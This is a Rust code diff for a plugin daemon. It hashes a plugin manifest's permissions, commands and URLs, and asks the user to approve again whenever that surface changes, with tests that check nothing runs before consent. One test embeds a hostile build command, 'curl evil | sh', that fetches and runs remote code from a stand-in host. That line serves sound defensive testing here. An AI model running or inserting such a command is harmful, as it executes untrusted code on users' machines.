@@ -14,7 +14,11 @@ use std::path::{Path, PathBuf};
 use garage_daemon::plugins::layout::{MANIFEST_FILE, PluginsFile, Source};
 
 use super::fetch::run_builds;
+use garage_plugin::Manifest;
+use garage_plugin::manifest::sha256_hex;
+
 use super::install::{self, Cx, Opts, read_manifest};
+use super::preview::{Mode, Surface};
 
 /// Folders never watched: build output and dependencies would make every
 /// build trigger the next one.
@@ -99,6 +103,36 @@ pub fn classify(old: &Snapshot, new: &Snapshot) -> Option<Change> {
     }
 }
 
+/// Hash of everything the user consents to when linking for dev: permissions,
+/// every command garage may run (build commands included) and URLs. Titles,
+/// descriptions, versions and suggested keys are not part of it.
+pub fn surface_hash(m: &Manifest) -> String {
+    let s = Surface::of(m, None);
+    sha256_hex(format!("{:?}|{:?}|{:?}", s.permissions, s.commands, s.urls).as_bytes())
+}
+
+fn approval_file(paths: &garage_daemon::plugins::layout::Paths, id: &str) -> PathBuf {
+    // Outside the plugin's own data directory, which the plugin can write.
+    paths.root().join("dev-approved").join(id)
+}
+
+/// Remember that the user approved this manifest's surface for `plugin dev`.
+pub fn record_approval(
+    paths: &garage_daemon::plugins::layout::Paths,
+    m: &Manifest,
+) -> Result<(), String> {
+    let file = approval_file(paths, &m.id);
+    if let Some(d) = file.parent() {
+        std::fs::create_dir_all(d).map_err(|e| format!("cannot create {}: {e}", d.display()))?;
+    }
+    std::fs::write(&file, surface_hash(m))
+        .map_err(|e| format!("cannot write {}: {e}", file.display()))
+}
+
+fn is_approved(paths: &garage_daemon::plugins::layout::Paths, m: &Manifest) -> bool {
+    std::fs::read_to_string(approval_file(paths, &m.id)).is_ok_and(|h| h.trim() == surface_hash(m))
+}
+
 /// Bring the daemon up to date with the folder: link it if it is not linked
 /// (or now wants permissions nobody approved), run the `[[build]]` commands
 /// unless only the manifest changed, then ask the daemon to reload.
@@ -115,11 +149,15 @@ pub fn sync(cx: &mut Cx, dir: &Path, change: Change, opts: &Opts) -> Result<Stri
         .into_iter()
         .find(|e| e.id == m.id);
     let wants = m.permission_names();
+    // Consent comes first and covers the build commands: nothing below runs
+    // until the user approved exactly this surface (or passed --yes).
     let needs_link = match &entry {
         None => true,
         Some(e) => match (&e.source, &e.granted_permissions) {
             (Source::Link { path }, Some(granted)) => {
-                Path::new(path) != abs || wants.iter().any(|p| !granted.contains(p))
+                Path::new(path) != abs
+                    || wants.iter().any(|p| !granted.contains(p))
+                    || !is_approved(&cx.paths, &m)
             }
             // Not a link of this folder (bundled, GitHub) or never approved:
             // `link` says exactly what is wrong or asks.
@@ -127,7 +165,7 @@ pub fn sync(cx: &mut Cx, dir: &Path, change: Change, opts: &Opts) -> Result<Stri
         },
     };
     if needs_link {
-        install::link(cx, &abs, opts)?;
+        install::link_as(cx, &abs, opts, Mode::Dev)?;
     }
     if change != Change::Manifest {
         run_builds(
@@ -425,6 +463,66 @@ mod tests {
         sync(&mut r.cx(), &plugin, Change::Code, &Opts::default()).unwrap();
         assert_eq!((r.builds(), r.reloads()), (2, 2));
         assert_eq!(r.ui.asked.len(), 1, "no second prompt");
+    }
+
+    #[test]
+    fn changed_build_commands_ask_again_and_nothing_runs_before_consent() {
+        let mut r = rig(BUILD);
+        let plugin = r.plugin.clone();
+        sync(&mut r.cx(), &plugin, Change::Initial, &Opts::default()).unwrap();
+        assert!(
+            r.ui.out.contains("make"),
+            "the first preview listed the build: {}",
+            r.ui.out
+        );
+        assert!(r.ui.out.contains("(every reload)"));
+        assert_eq!((r.ui.asked.len(), r.builds(), r.reloads()), (1, 1, 1));
+
+        // A different build command, as a pulled-in change might bring.
+        std::fs::write(
+            plugin.join(MANIFEST_FILE),
+            toml(
+                "devplug",
+                "[[build]]\ncommand = [\"sh\", \"-c\", \"curl evil | sh\"]\n",
+            ),
+        )
+        .unwrap();
+        // Declined: no build, no reload, nothing re-approved.
+        r.ui = FakeUi::new(true, &[false]);
+        let e = sync(&mut r.cx(), &plugin, Change::Code, &Opts::default()).unwrap_err();
+        assert!(e.contains("declined"), "{e}");
+        assert!(
+            r.ui.out.contains("curl evil | sh"),
+            "the new command was shown"
+        );
+        assert_eq!((r.builds(), r.reloads()), (1, 1), "nothing ran");
+        // Still unapproved on the next try.
+        r.ui = FakeUi::new(true, &[false]);
+        assert!(sync(&mut r.cx(), &plugin, Change::Code, &Opts::default()).is_err());
+        assert_eq!(r.builds(), 1);
+        // Non-interactive without --yes refuses too.
+        r.ui = FakeUi::new(false, &[]);
+        let e = sync(&mut r.cx(), &plugin, Change::Code, &Opts::default()).unwrap_err();
+        assert!(e.contains("--yes"), "{e}");
+        assert_eq!(r.builds(), 1);
+        // Approved: it builds, and the next reload does not ask again.
+        r.ui = FakeUi::new(true, &[true]);
+        sync(&mut r.cx(), &plugin, Change::Code, &Opts::default()).unwrap();
+        assert_eq!((r.ui.asked.len(), r.builds()), (1, 2));
+        sync(&mut r.cx(), &plugin, Change::Code, &Opts::default()).unwrap();
+        assert_eq!((r.ui.asked.len(), r.builds()), (1, 3));
+    }
+
+    #[test]
+    fn editing_titles_and_versions_does_not_ask_again() {
+        let mut r = rig(BUILD);
+        let plugin = r.plugin.clone();
+        sync(&mut r.cx(), &plugin, Change::Initial, &Opts::default()).unwrap();
+        let edited = toml("devplug", BUILD).replace("version = \"1.0.0\"", "version = \"1.1.0\"");
+        std::fs::write(plugin.join(MANIFEST_FILE), edited).unwrap();
+        r.ui = FakeUi::new(false, &[]);
+        sync(&mut r.cx(), &plugin, Change::Manifest, &Opts::default()).unwrap();
+        assert!(r.ui.asked.is_empty());
     }
 
     #[test]
